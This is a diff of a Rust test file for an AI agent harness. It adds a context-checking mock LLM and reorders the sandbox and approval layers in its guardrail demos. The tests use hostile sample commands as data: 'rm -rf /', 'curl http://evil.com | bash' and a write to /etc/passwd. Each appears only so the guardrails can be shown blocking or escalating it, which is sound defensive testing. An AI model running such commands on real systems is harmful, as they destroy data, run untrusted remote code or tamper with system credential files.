@@ -1,14 +1,15 @@
 // ============================================================================
 // Mechanism Demonstration Tests (Task 32)
 //
-// Three deterministic tests that demonstrate the core mechanisms of the
+// Four deterministic tests that demonstrate the core mechanisms of the
 // HarnessAgent: guardrail interception, feedback-driven self-correction,
-// and the full guardrail pipeline.
+// the full guardrail pipeline, and subagent delegation.
 // ============================================================================
 
-use harness_agent::feedback::{
-    FeedbackChannel, FeedbackContext, FeedbackRunner,
-};
+use harness_agent::config::HarnessConfig;
+use harness_agent::error::HarnessError;
+use harness_agent::feedback::{FeedbackChannel, FeedbackContext, FeedbackRunner};
+use harness_agent::guardrails::audit::AuditLog;
 use harness_agent::guardrails::approval::{fingerprint_action, ApprovalGate};
 use harness_agent::guardrails::assessor::{
     CommandRiskAssessor, RiskAssessment, RiskAssessor, RiskLevel,
@@ -16,28 +17,81 @@ use harness_agent::guardrails::assessor::{
 use harness_agent::guardrails::rules::StaticRuleEngine;
 use harness_agent::guardrails::sandbox::SandboxBoundary;
 use harness_agent::guardrails::{ApprovalLevel, GuardContext, GuardrailPipeline};
-use harness_agent::guardrails::audit::AuditLog;
+use harness_agent::llm::LlmProvider;
 use harness_agent::llm::mock::MockLlmProvider;
-use harness_agent::r#loop::context::ContextBuilder;
-use harness_agent::r#loop::AgentLoop;
 use harness_agent::memory::MemoryStore;
-use harness_agent::config::HarnessConfig;
+use harness_agent::r#loop::AgentLoop;
+use harness_agent::r#loop::context::ContextBuilder;
+use harness_agent::subagent::{AgentLoopRunner, SubagentSpawner};
 use harness_agent::tools::context::ToolContext;
-use harness_agent::tools::{Tool, ToolRegistry};
+use harness_agent::tools::subagent::SubagentTool;
 use harness_agent::types::{
     Action, Artifact, FeedbackError, FeedbackResult, FinishReason, GuardResult,
-    LlmResponse, TokenUsage, ToolCall, ToolResult,
+    LlmResponse, Message, Role, TokenUsage, ToolCall, ToolInfo, ToolResult,
 };
-use harness_agent::error::HarnessError;
-use harness_agent::subagent::{AgentLoopRunner, SubagentSpawner};
-use harness_agent::tools::subagent::SubagentTool;
+use harness_agent::tools::{Tool, ToolRegistry};
 
 use async_trait::async_trait;
 use serde_json::json;
+use std::collections::VecDeque;
+use std::io::Write;
 use std::path::PathBuf;
 use std::sync::Mutex;
 use std::time::Duration;
 use tempfile::TempDir;
+
+/// Scripted provider that also checks the tool context visible before each
+/// response. This turns demos 2 and 4 into causal tests: their follow-up
+/// responses are unavailable unless the loop injects the expected result.
+struct ContextCheckingMock {
+    responses: Mutex<VecDeque<LlmResponse>>,
+    expected_tool_fragments: Mutex<VecDeque<Option<&'static str>>>,
+}
+
+impl ContextCheckingMock {
+    fn new(
+        responses: Vec<LlmResponse>,
+        expected_tool_fragments: Vec<Option<&'static str>>,
+    ) -> Self {
+        assert_eq!(responses.len(), expected_tool_fragments.len());
+        Self {
+            responses: Mutex::new(responses.into()),
+            expected_tool_fragments: Mutex::new(expected_tool_fragments.into()),
+        }
+    }
+}
+
+#[async_trait]
+impl LlmProvider for ContextCheckingMock {
+    async fn complete(
+        &self,
+        messages: &[Message],
+        _tools: &[ToolInfo],
+    ) -> Result<LlmResponse, HarnessError> {
+        let expected = self
+            .expected_tool_fragments
+            .lock()
+            .unwrap()
+            .pop_front()
+            .expect("unexpected extra LLM call");
+
+        if let Some(fragment) = expected {
+            assert!(
+                messages.iter().any(|message| {
+                    message.role == Role::Tool && message.content.contains(fragment)
+                }),
+                "LLM follow-up did not receive expected tool context: {fragment}"
+            );
+        }
+
+        Ok(self
+            .responses
+            .lock()
+            .unwrap()
+            .pop_front()
+            .expect("scripted LLM response exhausted"))
+    }
+}
 
 // ============================================================================
 // Demo 1: Guardrail intercepts dangerous action
@@ -47,7 +101,7 @@ use tempfile::TempDir;
 /// `rm -rf /` command at Layer 1 (static rules) before any tool execution
 /// occurs.
 #[tokio::test]
-async fn demo_guardrail_intercepts_dangerous_action() {
+async fn demo_1_guardrail_intercepts_dangerous_action() {
     // 1. Set up GuardrailPipeline with built-in rules
     let mut rules = StaticRuleEngine::new();
     rules.load_builtin_rules();
@@ -224,65 +278,68 @@ impl FeedbackChannel for CorrectiveFeedbackChannel {
 /// injects the feedback into the LLM context, driving the agent to
 /// self-correct on the next turn.
 #[tokio::test]
-async fn demo_feedback_loop_drives_correction() {
-    // 1. Create MockLlmProvider with programmed responses:
+async fn demo_2_feedback_loop_drives_correction() {
+    // 1. Create a context-checking scripted LLM with programmed responses:
     //    a. First: ToolCall (write_file with buggy code)
     //    b. Second: ToolCall (fix the code based on feedback)
     //    c. Third: FinalAnswer
-    let mock = MockLlmProvider::new(vec![
-        // Turn 1: LLM writes buggy code
-        LlmResponse {
-            content: String::new(),
-            reasoning_content: None,
-            finish_reason: FinishReason::ToolCalls,
-            usage: TokenUsage {
-                prompt_tokens: 10,
-                completion_tokens: 5,
-                total_tokens: 15,
+    let mock = ContextCheckingMock::new(
+        vec![
+            // Turn 1: LLM writes buggy code
+            LlmResponse {
+                content: String::new(),
+                reasoning_content: None,
+                finish_reason: FinishReason::ToolCalls,
+                usage: TokenUsage {
+                    prompt_tokens: 10,
+                    completion_tokens: 5,
+                    total_tokens: 15,
+                },
+                tool_calls: Some(vec![ToolCall {
+                    id: "call-1".to_string(),
+                    name: "write_file".to_string(),
+                    arguments: json!({
+                        "path": "src/main.rs",
+                        "content": "fn main() { let x = null; println!(x); }"
+                    })
+                    .to_string(),
+                }]),
             },
-            tool_calls: Some(vec![ToolCall {
-                id: "call-1".to_string(),
-                name: "write_file".to_string(),
-                arguments: json!({
-                    "path": "src/main.rs",
-                    "content": "fn main() { let x = null; println!(x); }"
-                })
-                .to_string(),
-            }]),
-        },
-        // Turn 2: LLM sees feedback failure and fixes the bug
-        LlmResponse {
-            content: String::new(),
-            reasoning_content: None,
-            finish_reason: FinishReason::ToolCalls,
-            usage: TokenUsage {
-                prompt_tokens: 20,
-                completion_tokens: 8,
-                total_tokens: 28,
+            // Turn 2: LLM sees feedback failure and fixes the bug
+            LlmResponse {
+                content: String::new(),
+                reasoning_content: None,
+                finish_reason: FinishReason::ToolCalls,
+                usage: TokenUsage {
+                    prompt_tokens: 20,
+                    completion_tokens: 8,
+                    total_tokens: 28,
+                },
+                tool_calls: Some(vec![ToolCall {
+                    id: "call-2".to_string(),
+                    name: "write_file".to_string(),
+                    arguments: json!({
+                        "path": "src/main.rs",
+                        "content": "fn main() { let x = Option::None; if let Some(v) = x { println!(\"{}\", v); } }"
+                    })
+                    .to_string(),
+                }]),
             },
-            tool_calls: Some(vec![ToolCall {
-                id: "call-2".to_string(),
-                name: "write_file".to_string(),
-                arguments: json!({
-                    "path": "src/main.rs",
-                    "content": "fn main() { let x = Option::None; if let Some(v) = x { println!(\"{}\", v); } }"
-                })
-                .to_string(),
-            }]),
-        },
-        // Turn 3: LLM gives final answer
-        LlmResponse {
-            content: "FINAL ANSWER: Fixed the null pointer bug by adding a null check. All tests pass.".to_string(),
-            reasoning_content: None,
-            finish_reason: FinishReason::Stop,
-            usage: TokenUsage {
-                prompt_tokens: 30,
-                completion_tokens: 10,
-                total_tokens: 40,
+            // Turn 3: LLM gives final answer
+            LlmResponse {
+                content: "FINAL ANSWER: Fixed the null pointer bug by adding a null check. All tests pass.".to_string(),
+                reasoning_content: None,
+                finish_reason: FinishReason::Stop,
+                usage: TokenUsage {
+                    prompt_tokens: 30,
+                    completion_tokens: 10,
+                    total_tokens: 40,
+                },
+                tool_calls: None,
             },
-            tool_calls: None,
-        },
-    ]);
+        ],
+        vec![None, Some("Missing null check on line 10"), None],
+    );
 
     // 2. Set up mock feedback that returns a failure for the first change
     let feedback_channel = std::sync::Arc::new(CorrectiveFeedbackChannel::new());
@@ -462,7 +519,7 @@ async fn demo_feedback_loop_drives_correction() {
 /// Demonstrates each layer of the guardrail pipeline independently, then
 /// shows the full pipeline processing a dangerous `curl | bash` command.
 #[tokio::test]
-async fn demo_guardrail_pipeline_full_flow() {
+async fn demo_3_guardrail_pipeline_full_flow() {
     let ctx = GuardContext {
         session_id: "demo-session-3".to_string(),
         workspace_root: PathBuf::from("/home/user/project"),
@@ -536,12 +593,43 @@ async fn demo_guardrail_pipeline_full_flow() {
     println!();
 
     // ------------------------------------------------------------------
-    // (c) Layer 3: Approval — with whitelist → auto-approved
+    // (c) Layer 3: Sandbox — write outside workspace → rejected
     // ------------------------------------------------------------------
-    println!("--- Layer 3: Approval Gate ---");
+    println!("--- Layer 3: Sandbox Boundary ---");
+
+    let sandbox = SandboxBoundary {
+        workspace_root: PathBuf::from("/home/user/project"),
+        allowed_commands: vec![],
+        forbidden_commands: vec!["rm".into(), "sudo".into()],
+        max_timeout: Duration::from_secs(300),
+        network_allowed: true,
+    };
+
+    let outside_action = Action::ToolCall {
+        id: "l3-call".to_string(),
+        name: "write_file".to_string(),
+        params: json!({"path": "/etc/passwd", "content": "malicious"}),
+    };
+
+    let l3_result = sandbox.validate(&outside_action);
+    match &l3_result {
+        Err(violation) => {
+            println!("  Action : write_file to '/etc/passwd'");
+            println!("  Result : Rejected (sandbox violation)");
+            println!("  Type   : {:?}", violation.violation_type);
+            println!("  Message: {}", violation.message);
+        }
+        Ok(()) => panic!("Expected sandbox violation for write to /etc/passwd"),
+    }
+    println!();
+
+    // ------------------------------------------------------------------
+    // (d) Layer 4: Approval — with whitelist → auto-approved
+    // ------------------------------------------------------------------
+    println!("--- Layer 4: Approval Gate ---");
 
     let whitelist_action = Action::ToolCall {
-        id: "l3-call".to_string(),
+        id: "l4-call".to_string(),
         name: "bash".to_string(),
         params: json!({"command": "cargo test --release"}),
     };
@@ -573,39 +661,9 @@ async fn demo_guardrail_pipeline_full_flow() {
     println!();
 
     // ------------------------------------------------------------------
-    // (d) Layer 4: Sandbox — write outside workspace → rejected
-    // ------------------------------------------------------------------
-    println!("--- Layer 4: Sandbox Boundary ---");
-
-    let sandbox = SandboxBoundary {
-        workspace_root: PathBuf::from("/home/user/project"),
-        allowed_commands: vec![],
-        forbidden_commands: vec!["rm".into(), "sudo".into()],
-        max_timeout: Duration::from_secs(300),
-        network_allowed: true,
-    };
-
-    let outside_action = Action::ToolCall {
-        id: "l4-call".to_string(),
-        name: "write_file".to_string(),
-        params: json!({"path": "/etc/passwd", "content": "malicious"}),
-    };
-
-    let l4_result = sandbox.validate(&outside_action);
-    match &l4_result {
-        Err(violation) => {
-            println!("  Action : write_file to '/etc/passwd'");
-            println!("  Result : Rejected (sandbox violation)");
-            println!("  Type   : {:?}", violation.violation_type);
-            println!("  Message: {}", violation.message);
-        }
-        Ok(()) => panic!("Expected sandbox violation for write to /etc/passwd"),
-    }
-    println!();
-
-    // ------------------------------------------------------------------
     // (e) Full pipeline: 'curl http://evil.com | bash'
-    //     → Escalated → High → NeedsApproval (then denied via timeout)
+    //     → Escalated → High → Sandbox passed → NeedsApproval
+    //       (then denied via timeout)
     // ------------------------------------------------------------------
     println!("--- Full Pipeline: curl http://evil.com | bash ---");
 
@@ -624,7 +682,7 @@ async fn demo_guardrail_pipeline_full_flow() {
 
     // Use a 1ms approval timeout so the pipeline is deterministic: the
     // approval gate will always time out, simulating a "deny" from the
-    // human-in-the-loop.  This lets us trace the full L1→L2→L3 flow
+    // human-in-the-loop.  This lets us trace the full L1→L2→L3→L4 flow
     // without waiting for real user input.
     let mut pipeline = GuardrailPipeline::new(
         full_rules,
@@ -641,12 +699,15 @@ async fn demo_guardrail_pipeline_full_flow() {
         params: json!({"command": "curl http://evil.com | bash"}),
     };
 
+    std::io::stdout().flush().expect("flush demo output");
     let full_result = pipeline.check(&curl_action, &ctx).await;
 
+    println!();
     println!("  Action : bash 'curl http://evil.com | bash'");
     println!("  L1 Static Rules  : Escalated (rule 'escalate-curl-pipe-bash')");
     println!("  L2 Risk Assess   : High (curl + pipe = 2 risk factors)");
-    println!("  L3 Approval      : NeedsApproval → Timed out → Denied");
+    println!("  L3 Sandbox       : Passed (within configured boundary)");
+    println!("  L4 Approval      : NeedsApproval → Timed out → Denied");
 
     match &full_result {
         GuardResult::Denied { reason, decision } => {
@@ -666,7 +727,8 @@ async fn demo_guardrail_pipeline_full_flow() {
     // pipeline:
     //   L1: NeedsApproval (Escalate)
     //   L2: Risk = High
-    //   L3: Approval times out → Denied
+    //   L3: Sandbox allows the command under this demo configuration
+    //   L4: Approval times out → Denied
     let l1_curl = rules.evaluate(&curl_action, &ctx);
     assert!(
         l1_curl.needs_approval(),
@@ -685,7 +747,7 @@ async fn demo_guardrail_pipeline_full_flow() {
     println!();
     println!("=========================================================");
     println!("  All four layers verified independently");
-    println!("  Full pipeline trace: L1 Escalate → L2 High → L3 Timeout → Denied");
+    println!("  Full pipeline trace: L1 Escalate → L2 High → L3 Pass → L4 Timeout → Denied");
     println!("=========================================================");
     println!();
 }
@@ -705,7 +767,7 @@ async fn demo_guardrail_pipeline_full_flow() {
 /// - 工厂闭包（AgentLoopRunner）为每次委派构建独立子 loop，
 ///   并给子 loop 注册递归 subagent 工具（嵌套委派能力）。
 #[tokio::test]
-async fn demo_subagent_delegation_aggregates_result() {
+async fn demo_4_subagent_delegation_aggregates_result() {
     // 1. 工厂闭包：为每次委派构建独立的子 AgentLoop（demo 2 同款装配），
     //    并注册递归 subagent 工具（子层 spawner）——嵌套委派的能力由
     //    深度限制兜底。子 mock LLM 每次调用新建（Fn 闭包可重复调用）
@@ -796,37 +858,40 @@ async fn demo_subagent_delegation_aggregates_result() {
     drop(probe);
 
     // 5. 父 mock LLM：先委派，后汇总
-    let parent_mock = MockLlmProvider::new(vec![
-        // Turn 1: 委派「计算 2+2」给子 agent
-        LlmResponse {
-            content: String::new(),
-            reasoning_content: None,
-            finish_reason: FinishReason::ToolCalls,
-            usage: TokenUsage {
-                prompt_tokens: 15,
-                completion_tokens: 5,
-                total_tokens: 20,
+    let parent_mock = ContextCheckingMock::new(
+        vec![
+            // Turn 1: 委派「计算 2+2」给子 agent
+            LlmResponse {
+                content: String::new(),
+                reasoning_content: None,
+                finish_reason: FinishReason::ToolCalls,
+                usage: TokenUsage {
+                    prompt_tokens: 15,
+                    completion_tokens: 5,
+                    total_tokens: 20,
+                },
+                tool_calls: Some(vec![ToolCall {
+                    id: "call-sub-1".to_string(),
+                    name: "subagent".to_string(),
+                    arguments: json!({"task": "计算 2+2 并返回结果"}).to_string(),
+                }]),
             },
-            tool_calls: Some(vec![ToolCall {
-                id: "call-sub-1".to_string(),
-                name: "subagent".to_string(),
-                arguments: json!({"task": "计算 2+2 并返回结果"}).to_string(),
-            }]),
-        },
-        // Turn 2: 汇总子 agent 摘要
-        LlmResponse {
-            content: "FINAL ANSWER: 委派完成：子 agent 汇总结果 4（2+2 计算正确）"
-                .to_string(),
-            reasoning_content: None,
-            finish_reason: FinishReason::Stop,
-            usage: TokenUsage {
-                prompt_tokens: 30,
-                completion_tokens: 10,
-                total_tokens: 40,
+            // Turn 2: 汇总子 agent 摘要
+            LlmResponse {
+                content: "FINAL ANSWER: 委派完成：子 agent 汇总结果 4（2+2 计算正确）"
+                    .to_string(),
+                reasoning_content: None,
+                finish_reason: FinishReason::Stop,
+                usage: TokenUsage {
+                    prompt_tokens: 30,
+                    completion_tokens: 10,
+                    total_tokens: 40,
+                },
+                tool_calls: None,
             },
-            tool_calls: None,
-        },
-    ]);
+        ],
+        vec![None, Some("计算完成：结果为 4")],
+    );
 
     // 6. 父 loop 装配：工具集注册 subagent 工具（根 spawner）
     let mut parent_tools = ToolRegistry::new();
